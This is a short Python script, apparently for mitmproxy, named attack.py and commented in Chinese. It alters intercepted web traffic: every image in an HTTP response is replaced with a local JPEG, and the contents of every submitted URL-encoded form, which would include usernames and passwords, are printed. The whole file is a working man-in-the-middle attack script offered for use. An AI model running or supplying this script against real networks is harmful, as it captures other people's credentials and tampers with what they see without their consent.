# -*- coding:utf-8 -*-

#usage: mitmdump -s attack.py 

img = open('pkq.jpeg', 'rb').read()		#读取图片到内存

def response(flow):
	"""如果响应为image，则替换图片
	"""
	if 'content-type' in flow.response.headers and flow.response.headers['content-type'].startswith('image'):	
		flow.response.content = img 
		flow.response.headers['content-type'] = 'image/jpeg'


def request(flow):
	"""监听提交的表单
	"""
	if flow.request.urlencoded_form:
		print('form info: ', flow.request.urlencoded_form)

